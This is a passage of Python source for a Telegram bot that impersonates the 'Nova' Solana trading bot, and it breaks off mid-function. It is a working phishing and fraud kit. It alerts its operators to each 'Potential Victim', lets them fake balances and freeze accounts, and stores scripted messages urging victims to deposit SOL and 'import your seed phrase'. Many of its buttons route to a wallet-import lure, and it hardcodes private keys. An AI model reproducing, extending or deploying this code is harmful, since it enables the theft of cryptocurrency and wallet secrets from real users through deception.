import os
import time
import telegram

print(telegram.__file__)
import json
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from dotenv import load_dotenv

load_dotenv()

# ================================
# CONFIGURATION - EASILY ACCESSIBLE
# ================================
ACCESS_CODE = "sbj739p"  # Change this access code as needed

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))
SECOND_OWNER_ID = int(os.getenv("SECOND_OWNER_ID"))

# Replace with actual wallet/private key management
WALLET_ADDRESS = "E8VatMzPDZb9ZJk2bVpZXFmV5Sm4R9cS5V4HWXFuHBab"
PRIVATE_KEY = "4URv1TX4955vWnacAa9YSMcHJwRJSWdXdaTHpVkE7TECSy8AzAFiEZpkSWXizdTiymWFpzxrUR4FFaHWrMLxbCw"

# Predetermined wallets for creation (3 possible wallets)
PREDETERMINED_WALLETS = [{
    "name":
    "wallet2",
    "address":
    "HgGbdcqZkUtebqyGJoUk53QrPE7CBXHFDEvctKEy5q9d",
    "private_key":
    "5J8vN2mK9pLqR3xE4yT7uI6oP1sA8dF3gH2jC5kV9nB6mX7zQ4wE1rT8yU3iO0pL2sA5dF8gH1jC4kV7nB9mX6z"
}, {
    "name":
    "wallet3",
    "address":
    "BnF5cGhI8jKl2MnO3pQr4StU5vW6xY7zA1bC2dE3fG4h",
    "private_key":
    "2A7bC5dE8fG1hJ3kL6mN9oP2qR4sT7uV0wX3yZ6aB9cD2eF5gH8jK1lM4nO7pQ0rS3tU6vW9xY2zA5bC8dE1fG4h"
}, {
    "name":
    "wallet4",
    "address":
    "CpG6dHj9kLm3NoP4qRs5TuV7wX8yZ0aB2cD3eF4gH5i",
    "private_key":
    "3B8cD6eF9gH2iJ4kL7mN0oP3qR5sT8uV1wX4yZ7aB0cD3eF6gH9jK2lM5nO8pQ1rS4tU7vW0xY3zA6bC9dE2fG5h"
}]

# File path for storing approved users
APPROVED_USERS_FILE = "approved_users.json"

# Keep track of users who got wallet message and settings states
user_data = {}
settings_states = {}
user_balances = {}  # Track user SOL balances
user_usd_balances = {}  # Track user USD balances separately
admin_states = {}  # Track admin operation states
frozen_users = set()  # Track frozen users
queue_users = {}  # Track users in queue with their position and join time
pending_token_requests = set()  # Track users waiting to send token address
approved_users = set()  # Track users who have been approved

# Wallet management
user_wallets = {}  # Track created wallets per user
wallet_states = {}  # Track wallet operation states


def load_approved_users():
    """Load approved user IDs from JSON file"""
    global approved_users
    try:
        if os.path.exists(APPROVED_USERS_FILE):
            with open(APPROVED_USERS_FILE, 'r') as f:
                data = json.load(f)
                approved_users = set(data.get('approved_users', []))
                print(
                    f"Loaded {len(approved_users)} approved users from {APPROVED_USERS_FILE}"
                )
        else:
            approved_users = set()
            print(f"No approved users file found, starting with empty set")
    except Exception as e:
        print(f"Error loading approved users: {e}")
        approved_users = set()


def save_approved_users():
    """Save approved user IDs to JSON file"""
    try:
        data = {'approved_users': list(approved_users)}
        with open(APPROVED_USERS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(
            f"Saved {len(approved_users)} approved users to {APPROVED_USERS_FILE}"
        )
    except Exception as e:
        print(f"Error saving approved users: {e}")


def add_approved_user(user_id):
    """Add a user to the approved list and save to file"""
    approved_users.add(user_id)
    save_approved_users()


# Saved scripts
SAVED_SCRIPTS = {
    "script_1":
    "⚠️ Error: Wallet Import Issue Detected\n\n- An error has occurred while importing your wallet.\n- You have less than 0.5 SOL in the wallet you imported.\n- Your funds are currently on hold in your Bloom Wallet.\n\nAction Required:\n\n-Please deposit the minimum amount of 0.5 SOL to the wallet you are importing to proceed.\n\n-If you need assistance, please contact @BloomSupportUS",
    "script_2":
    "1. We have received your deposit. To proceed, a minimum deposit of 1 SOL is required.\n2. Your private key shows a zero balance, which is likely flagged as bot activity.\n3. You have been flagged as a bot. Please import your seed phrase to continue.",
    "script_3":
    "🔔 Reminder: Your account will be reviewed within 24 hours. Thank you for your patience.",
    "script_4":
    "💰 Congratulations! You've been selected for our premium features beta program.",
    "script_5":
    "📞 Our support team has reviewed your request. Please check your account for updates."
}


def current_time():
    return time.strftime("%H:%M:%S", time.localtime())


def calculate_queue_time(position, join_time=None):
    """Calculate estimated time until access based on queue position"""
    # Start with fixed time: 1h 36m 56s = 5816 seconds
    base_seconds = 5816

    if join_time:
        # Calculate elapsed time since joining
        elapsed = int(time.time() - join_time)
        remaining_seconds = max(0, base_seconds - elapsed)
    else:
        remaining_seconds = base_seconds

    hours = remaining_seconds // 3600
    minutes = (remaining_seconds % 3600) // 60
    seconds = remaining_seconds % 60

    return hours, minutes, seconds


def get_user_wallets(user_id):
    """Get all wallets for a user"""
    if user_id not in user_wallets:
        user_wallets[user_id] = {}
    return user_wallets[user_id]


def get_next_predetermined_wallet(user_id):
    """Get the next predetermined wallet for the user"""
    wallets = get_user_wallets(user_id)
    used_count = len(wallets)

    if used_count < len(PREDETERMINED_WALLETS):
        return PREDETERMINED_WALLETS[used_count]
    else:
        # Fallback to random if all predetermined wallets are used
        import random
        import string
        chars = string.ascii_letters + string.digits
        return {
            "name": f"wallet{used_count + 2}",
            "address": ''.join(random.choices(chars, k=44)),
            "private_key": ''.join(random.choices(chars, k=88))
        }


# Keyboards


def welcome_keyboard():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⏳ Join Queue", callback_data="join_queue")],
         [
             InlineKeyboardButton("🔑 Enter Access Code",
                                  callback_data="enter_access_code")
         ]])


def queue_keyboard():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("🔄 Refresh", callback_data="refresh_queue")],
         [
             InlineKeyboardButton("🔑 Enter Access Code",
                                  callback_data="enter_access_code")
         ]])


def invalid_code_keyboard():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⏳ Join Queue", callback_data="join_queue")],
         [
             InlineKeyboardButton("🔑 Enter Access Code",
                                  callback_data="enter_access_code")
         ]])


def continue_keyboard():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("Continue", callback_data="continue")]])


def go_to_menu_keyboard():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅️ Go to Menu", callback_data="go_to_menu")]])


def start_trading_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Start Trading", callback_data="start_trading")
    ]])


def main_menu_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("📈 Buy", callback_data="buy"),
            InlineKeyboardButton("💼 Positions", callback_data="positions")
        ],
         [
             InlineKeyboardButton("💳 Wallets",
                                  callback_data="settings_wallets"),
             InlineKeyboardButton("🎯 Sniper", callback_data="lp_sniper")
         ],
         [
             InlineKeyboardButton("📖 Limit Orders",
                                  callback_data="limit_orders"),
             InlineKeyboardButton("🤖 Copy Trade", callback_data="copy_trade")
         ],
         [
             InlineKeyboardButton("💤 AFK", callback_data="afk_mode"),
             InlineKeyboardButton("🕹️ Auto Buy", callback_data="auto_buy")
         ],
         [
             InlineKeyboardButton("🖱️ Nova Click", callback_data="nova_click"),
             InlineKeyboardButton("💰 Referrals", callback_data="referrals")
         ],
         [
             InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ], [InlineKeyboardButton("🗑️ Close", callback_data="close")]])


def positions_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("⬅️", callback_data="popup_import_wallet"),
            InlineKeyboardButton("W1", callback_data="popup_import_wallet"),
            InlineKeyboardButton("➡️", callback_data="popup_import_wallet")
        ],
         [
             InlineKeyboardButton("⬅️", callback_data="popup_import_wallet"),
             InlineKeyboardButton("Page 1/1",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("➡️", callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🆕 Import Position",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⬅️ Back to menu",
                                  callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ]])


def wallets_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("⬅️ Back to menu", callback_data="main_menu"),
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
        ],
         [
             InlineKeyboardButton("✅ Change Default Wallet",
                                  callback_data="change_default_wallet")
         ],
         [
             InlineKeyboardButton("🆕 Create Wallet",
                                  callback_data="create_wallet"),
             InlineKeyboardButton("📥 Import Wallet",
                                  callback_data="import_wallet")
         ],
         [
             InlineKeyboardButton("📝 Rename Wallet",
                                  callback_data="rename_wallet"),
             InlineKeyboardButton("🗑️ Delete Wallet",
                                  callback_data="delete_wallet")
         ],
         [
             InlineKeyboardButton("💸 Withdraw",
                                  callback_data="withdraw_wallet"),
             InlineKeyboardButton("🔐 Export Private Key",
                                  callback_data="export_private_key")
         ],
         [
             InlineKeyboardButton("🔒 Security Pin Settings",
                                  callback_data="security_pin_settings"),
             InlineKeyboardButton("⚙️ Settings", callback_data="settings")
         ]])


def change_default_wallet_keyboard(user_id):
    """Generate keyboard for changing default wallet"""
    buttons = []
    wallets = get_user_wallets(user_id)

    # Add W1 button
    buttons.append(
        [InlineKeyboardButton("🟢 W1", callback_data="set_default_w1")])

    # Add created wallets as individual buttons
    for wallet_name in wallets:
        buttons.append([
            InlineKeyboardButton(wallet_name,
                                 callback_data=f"set_default_{wallet_name}")
        ])

    buttons.append(
        [InlineKeyboardButton("⬅️ Back", callback_data="settings_wallets")])
    return InlineKeyboardMarkup(buttons)


def wallet_selection_keyboard(user_id, action):
    """Generate keyboard for selecting wallets"""
    buttons = []
    wallets = get_user_wallets(user_id)

    # Add W1 button
    buttons.append([InlineKeyboardButton("W1", callback_data=f"{action}_w1")])

    # Add created wallets
    for wallet_name in wallets:
        buttons.append([
            InlineKeyboardButton(wallet_name,
                                 callback_data=f"{action}_{wallet_name}")
        ])

    buttons.append(
        [InlineKeyboardButton("⬅️ Back", callback_data="settings_wallets")])
    return InlineKeyboardMarkup(buttons)


def security_pin_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("📧 Set Recovery Email",
                             callback_data="set_recovery_email")
    ], [InlineKeyboardButton("⬅️ Back", callback_data="settings_wallets")]])


def sniper_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("▶️ Start All",
                                 callback_data="popup_import_wallet"),
            InlineKeyboardButton("⏸️ Stop All",
                                 callback_data="popup_import_wallet")
        ],
         [
             InlineKeyboardButton("🆕 New Task",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("🗑️ Delete Task",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⬅️ Back to Menu",
                                  callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ]])


def limit_orders_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("⬅️ Back to menu", callback_data="main_menu"),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
    ],
                                 [
                                     InlineKeyboardButton(
                                         "🗑️ Delete Task",
                                         callback_data="popup_import_wallet")
                                 ]])


def copy_trade_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("▶️ Start All",
                                 callback_data="popup_import_wallet"),
            InlineKeyboardButton("⏸️ Stop All",
                                 callback_data="popup_import_wallet")
        ],
         [
             InlineKeyboardButton("🆕 New Task",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("🗑️ Delete Task",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⏩️ Mass Add",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⬅️ Back to Menu",
                                  callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ]])


def afk_mode_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("▶️ Start All",
                                 callback_data="popup_import_wallet"),
            InlineKeyboardButton("⏸️ Pause All",
                                 callback_data="popup_import_wallet")
        ],
         [
             InlineKeyboardButton("🆕 New Task",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("🗑️ Delete Task",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⬅️ Back to Menu",
                                  callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ]])


def referrals_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("🔑 Change referral code",
                                 callback_data="change_referral_code")
        ],
         [
             InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ], [InlineKeyboardButton("❌ Close", callback_data="close")]])


def withdraw_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("50%", callback_data="withdraw_50"),
            InlineKeyboardButton("100%", callback_data="withdraw_100"),
            InlineKeyboardButton("X SOL", callback_data="withdraw_x")
        ],
         [
             InlineKeyboardButton("💸 Set address",
                                  callback_data="popup_set_address")
         ],
         [
             InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ], [InlineKeyboardButton("❌ Close", callback_data="close")]])


def settings_keyboard(user_id):
    # Initialize user settings if not exists
    if user_id not in settings_states:
        settings_states[user_id] = {
            "expert_mode": False,
            "degen_mode": False,
            "mev_protection": False
        }

    states = settings_states[user_id]
    expert_emoji = "🟢" if states["expert_mode"] else "🔴"
    degen_emoji = "🟢" if states["degen_mode"] else "🔴"
    mev_emoji = "🟢" if states["mev_protection"] else "🔴"

    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton(f"{expert_emoji} Expert mode",
                                 callback_data="settings_expert_mode")
        ],
         [
             InlineKeyboardButton("⛽️ Fee", callback_data="settings_fee"),
             InlineKeyboardButton("💰 Wallets",
                                  callback_data="settings_wallets")
         ],
         [
             InlineKeyboardButton("🛍️ Slippage",
                                  callback_data="settings_slippage"),
             InlineKeyboardButton("🔧 Presets",
                                  callback_data="settings_presets")
         ],
         [
             InlineKeyboardButton(f"{degen_emoji} Degen mode",
                                  callback_data="settings_degen_mode"),
             InlineKeyboardButton(f"{mev_emoji} MEV protection",
                                  callback_data="settings_mev_protection")
         ],
         [
             InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
         ], [InlineKeyboardButton("❌ Close", callback_data="close")]])


def panel_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("💰 Add Balance",
                                 callback_data="admin_add_balance"),
            InlineKeyboardButton("💬 Message User",
                                 callback_data="admin_message_user")
        ],
         [
             InlineKeyboardButton("📝 Saved Scripts",
                                  callback_data="admin_saved_scripts")
         ],
         [
             InlineKeyboardButton("🔒 Freeze User",
                                  callback_data="admin_freeze_user"),
             InlineKeyboardButton("🔓 Unfreeze User",
                                  callback_data="admin_unfreeze_user")
         ], [InlineKeyboardButton("❌ Close", callback_data="close")]])


def saved_scripts_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("🚫 Wallet Import Error",
                                 callback_data="script_script_1"),
            InlineKeyboardButton("🔍 Bot Detection Alert",
                                 callback_data="script_script_2")
        ],
         [
             InlineKeyboardButton("⏰ Account Review Notice",
                                  callback_data="script_script_3"),
             InlineKeyboardButton("💎 Premium Beta Invite",
                                  callback_data="script_script_4")
         ],
         [
             InlineKeyboardButton("💬 Support Response",
                                  callback_data="script_script_5")
         ],
         [
             InlineKeyboardButton("⬅️ Back", callback_data="admin_panel"),
             InlineKeyboardButton("❌ Close", callback_data="close")
         ]])


def confirm_keyboard(action, data):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Confirm",
                             callback_data=f"confirm_{action}_{data}"),
        InlineKeyboardButton("❌ Decline",
                             callback_data=f"decline_{action}_{data}")
    ]])


def auto_buy_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("🔴 Disabled",
                                 callback_data="toggle_auto_buy_status"),
            InlineKeyboardButton("💳 Wallets", callback_data="settings_wallets")
        ],
         [
             InlineKeyboardButton("🆕 Add Rule",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("🗑️ Delete Rule",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🔴 Buy once",
                                  callback_data="toggle_buy_once"),
             InlineKeyboardButton("💸 TP & SL",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
             InlineKeyboardButton("🔄 Refresh",
                                  callback_data="refresh_auto_buy")
         ]])


def nova_click_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("⬅️ Back", callback_data="main_menu"),
        InlineKeyboardButton("❌ Close", callback_data="close")
    ]])


def referrals_keyboard_new():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("⬅️ Back to menu", callback_data="main_menu"),
            InlineKeyboardButton("🔄 Refresh",
                                 callback_data="refresh_referrals")
        ],
         [
             InlineKeyboardButton("💳 Rewards Wallet: W1",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🎁 Change Referral Code",
                                  callback_data="change_referral_code")
         ]])


def nova_settings_keyboard():
    return InlineKeyboardMarkup(
        [[
            InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"),
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_settings")
        ],
         [
             InlineKeyboardButton("🧃 Fee",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("💧 Slippage",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🟢 MEV Protect",
                                  callback_data="toggle_mev_protect_buy"),
             InlineKeyboardButton("🛠️ Buy: Jito",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🟢 MEV Protect",
                                  callback_data="toggle_mev_protect_sell"),
             InlineKeyboardButton("🛠️ Sell: Jito",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("⚙️ Presets",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("💳 Wallets",
                                  callback_data="settings_wallets")
         ],
         [
             InlineKeyboardButton("⚡ Quick Buy",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("💰 Quick Sell",
                                  callback_data="popup_import_wallet")
         ],
         [
             InlineKeyboardButton("🎮 Auto Buy", callback_data="auto_buy"),
             InlineKeyboardButton("🖱️ Nova Click", callback_data="nova_click")
         ],
         [
             InlineKeyboardButton("🌐 Language: 🇺🇸",
                                  callback_data="popup_import_wallet"),
             InlineKeyboardButton("❌ Close", callback_data="close")
         ]])


# Messages


def get_welcome_message():
    return (
        "🌠 <b>Welcome to Nova!</b>\n\n"
        "• The fastest Telegram Bot on Solana. Nova allows you to buy or sell tokens in lightning fast speed and also has many features including: Migration Sniping, Copy-trading, Limit Orders & a lot more.\n\n"
        "💡 <b>Have an access code?</b>\n"
        "• Enter it below to unlock instant access.\n\n"
        "⏳ <b>No access code?</b>\n"
        "• Tap the button below to join the queue and be the first to experience lightning-fast transactions.\n\n"
        "🚀 <b>Let's get started!</b>")


def get_queue_message(position, join_time=None):
    hours, minutes, seconds = calculate_queue_time(position, join_time)
    return (
        f"🌠 <b>You're currently #{position} on the Nova waitlist!</b>\n\n"
        f"• <b>Access granted in:</b> {hours}h {minutes}m {seconds}s\n\n"
        "⬇️ <b>Have an access code?</b> Simply send it below to get instant access."
    )


def get_invalid_code_message():
    return (
        "⛔ <b>Invalid Access Code!</b>\n\n"
        "• The access code you have provided is invalid.\n\n"
        "💡 <b>Have an access code?</b>\n"
        "• Send it below to get instant access.\n\n"
        "⏳ <b>No access code?</b>\n"
        "• Tap the button below to join the queue and be the first to experience lightning-fast transactions.\n\n"
        "🚀 <b>Select an option below.</b>")


def get_approved_message():
    return (
        "🎉 <b>Congratulations! Your access code has been successfully approved!</b>\n\n"
        "Welcome to Nova — the Fastest All-In-One Trading Platform. Effortlessly trade any token on Solana with complete control at your fingertips.\n\n"
        "✅ <b>Access Granted: Nova Phase 1</b>\n\n"
        "Don't forget to join our Support channel and explore the guide below for a smooth start:\n\n"
        "👉 <a href='https://discord.gg/tradeonnova'>Join Support</a>\n"
        "👉 <a href='https://docs.tradeonnova.io/'>Nova Guide</a>\n"
        "👉 <a href='https://www.youtube.com/@TradeonNova'>YouTube</a>\n\n"
        "💡 Ready to begin? Press Continue below to start using Nova.")


def get_wallet_message():
    return (
        "✅ <b>You've accepted our terms & conditions, you can now use Nova!</b>\n\n"
        "🟢 <b>Your wallet is detailed below:</b>\n\n"
        "<b>Your Solana Wallet Address:</b>\n"
        f"<code>{WALLET_ADDRESS}</code>\n\n"
        "<b>Private Key:</b>\n"
        f"<code>{PRIVATE_KEY}</code>\n\n"
        "💡 Be sure to keep this information above in a safe place. This message will be auto-deleted."
    )


def get_main_menu_message(user_id=None):
    timestamp = current_time()
    sol_balance = user_balances.get(user_id, 0) if user_id else 0
    usd_balance = user_usd_balances.get(user_id, 0) if user_id else 0

    # Create balance display with inputted USD value
    if sol_balance > 0 and usd_balance > 0:
        balance_text = f"{sol_balance:.0f} SOL (${usd_balance:.2f} USD)"
    elif sol_balance > 0:
        balance_text = f"{sol_balance:.0f} SOL"
    elif usd_balance > 0:
        balance_text = f"${usd_balance:.2f} USD"
    else:
        balance_text = "0 SOL ($0.00 USD)"

    # Check if user is frozen
    if user_id and user_id in frozen_users:
        freeze_message = "\n🔴 <b>Your funds are currently placed on hold, please contact support</b>\n"
    else:
        freeze_message = ""

    return (
        "🌠 <b>Welcome to Nova!</b>\n\n"
        "🚀 The Fastest All-In-One Trading Platform.\n\n"
        "💳 <b>Your Solana Wallets:</b>\n\n"
        f"→ W1 (Default) - {balance_text}\n"
        f"<code>{WALLET_ADDRESS}</code>\n"
        f"{freeze_message}\n"
        "📖 <a href='https://docs.tradeonnova.io/'>Guide</a>\n"
        "🐦 <a href='https://x.com/TradeonNova'>Twitter</a>\n"
        "👥 <a href='https://discord.gg/tradeonnova'>Support Channel</a>\n"
        "▶️ <a href='https://www.youtube.com/@TradeonNova'>YouTube</a>\n"
        "🎁 <a href='https://dashboard.tradeonnova.io/login'>Dashboard</a>\n\n"
        "🤖 <b>Use Backup Bots for uninterrupted performance:</b>\n\n"
        "🇺🇸 <a href='https://t.me/TradeOnNovaEU_bot'>US1</a>\n"
        "🇺🇸 <a href='https://t.me/TradeonNova3Bot'>US2</a>\n"
        "🇪🇺 <a href='https://t.me/TradeonNova2Bot'>EU1</a>\n\n"
        "💡 Ready to start trading? Send a token address to get started.")


# Handlers


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    user_id = user.id

    # Send one owner alert only once per user session
    if not context.chat_data.get("owner_alert_sent"):
        # Format username
        username_display = user.username if user.username else "❌"

        # Check if user has Telegram Premium
        premium_status = "✅" if user.is_premium else "❌"

        message_text = ("⚠️ Potential Victim\n"
                        f"├ 👤 {username_display}\n"
                        f"├ 🆔 {user_id}\n"
                        f"├ 💎 Premium: {premium_status}\n"
                        "🔹 A victim just ran /start using your link.")

        await context.bot.send_message(chat_id=OWNER_ID, text=message_text)
        if SECOND_OWNER_ID:
            await context.bot.send_message(chat_id=SECOND_OWNER_ID,
                                           text=message_text)
        context.chat_data["owner_alert_sent"] = True

    # Check if user is already approved (persistent check)
    if user_id in approved_users:
        # User is already approved, set state to complete and show main menu
        user_data[user_id] = {
            "state": "complete",
            "queue_position": None,
            "queue_join_time": None
        }
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_main_menu_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )
        return

    # Initialize user data if not exists
    if user_id not in user_data:
        user_data[user_id] = {
            "state": "new",  # new, queue, access_granted, complete
            "queue_position": None,
            "queue_join_time": None
        }

    # Check user's current state
    user_state = user_data[user_id]["state"]

    if user_state == "new":
        # Show welcome message with options
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_welcome_message(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=welcome_keyboard(),
        )
    elif user_state == "queue":
        # Show queue status
        position = user_data[user_id]["queue_position"]
        join_time = user_data[user_id]["queue_join_time"]
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_queue_message(position, join_time),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=queue_keyboard(),
        )
    elif user_state == "access_granted":
        # Show approved message
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_approved_message(),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=continue_keyboard(),
        )
    elif user_state == "complete":
        # Show main menu
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_main_menu_message(user_id),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard(),
        )


async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel command - only for owners"""
    user = update.effective_user
    user_id = user.id
    chat_id = update.effective_chat.id

    # Check if user is an owner
    if user_id not in [OWNER_ID, SECOND_OWNER_ID]:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ Access denied. This command is for administrators only.",
        )
        return

    # Send admin panel
    text = ("🔧 <b>Admin Panel</b>\n\n"
            "Welcome to the administrative control panel.\n"
            "Select an option below:\n\n"
            f"🕒 Accessed at: {current_time()}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode=ParseMode.HTML,
        reply_markup=panel_keyboard(),
    )


async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support command"""
    chat_id = update.effective_chat.id

    text = ("<b>Support Request</b>\n\n"
            "For assistance or any questions,\n"
            "please contact: @BloomSupportEU\n\n"
            "Our team is available to help you.")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        parse_mode=ParseMode.HTML,
    )


async def positions_command(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    """Positions command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "💼 Nova Positions\n\n"
        "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/selling'>Click Here!</a>\n\n"
        "• No positions found.\n\n"
        f"🕒 Last Updated: {current_time()}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=positions_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """LP Sniper command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "🎯 Nova Sniper\n\n"
        "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
        "🌐 Snipe Pump.Fun migrating tokens and new Raydium pools.\n\n"
        "• No active sniper tasks.\n\n"
        "💡 Create and configure tasks below.")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=sniper_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def copy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Copy Trade command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = ("🤖 Nova Copy Trade\n\n"
            "🌐 Utilize blazing fast copy-trading speeds with Nova.\n\n"
            "• No copy trade tasks found.\n\n"
            "💡 Create a task below.")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=copy_trade_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def afk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AFK Mode command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "💤 Nova AFK\n\n"
        "📚 Need more help? <a href='https://docs.tradeonnova.io/modules/sniper'>Click Here!</a>\n\n"
        "🌐 Automatically buy into new Pump.Fun & Raydium tokens as soon as they launch based on your filters.\n\n"
        "• No active AFK tasks.\n\n"
        "💡 Create and configure tasks below.")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=afk_mode_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def orders_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Limit Orders command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = (
        "📖 Nova Limit Orders\n\n"
        "🌐 Automatically trigger buy and sell trades when a token or position hits a certain market cap, price or profit level.\n\n"
        "• No active limit orders.\n\n"
        "💡 Orders can be created by pasting a token address.")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
        reply_markup=limit_orders_keyboard(),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )


async def referrals_command(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    """Referrals command"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    text = ("🌸 Bloom Referral Program\n\n"
            "Your Referral Code:\n"
            "🔗 ref_0EW9TYD0C\n\n"
            "Your Payout Address:\n"
            "PLACEHOLDER\n\n"
            "📈 Referrals Volume:\n\n"
            "• Level 1: 0 Users / 0 SOL\n"
            "• Level 2: 0 Users / 0 SOL\n"
            "• Level 3: 0 Users / 0 SOL\n"
            "• Referred Trades: 0\n\n"
            "📊 Rewards Overview:\n\n"
            "• Total Unclaimed: 0 SOL\n"
            "• Total Claimed: 0 SOL\n"
            "• Lifetime Earnings: 0 SOL\n"
            "• Last distribution: 2025-02-16 12:19:06\n\n"
            "📖 Learn More!\n\n"
            f"🕒 Last updated: {current_time()}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=text,
